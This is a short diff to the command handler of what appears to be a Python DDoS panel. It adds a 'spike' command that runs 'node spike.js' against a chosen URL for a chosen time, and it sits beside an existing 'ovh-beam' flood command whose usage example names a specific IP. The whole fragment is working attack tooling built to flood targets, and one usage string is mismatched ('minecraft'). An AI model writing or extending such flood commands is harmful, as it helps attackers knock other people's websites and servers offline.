@@ -455,6 +455,15 @@ def main():
             except IndexError:
                 print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                 print('Example: ovh-beam GET 51.38.92.223 80 60')
+
+        elif "spike" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node spike.js {url} 20 {time}')
+            except IndexError:
+                print('Usage: minecraft <url> <time>')
+                print('Example: spike https://example.com 100')
     
         elif "https-spoof" in cnc:
             try:
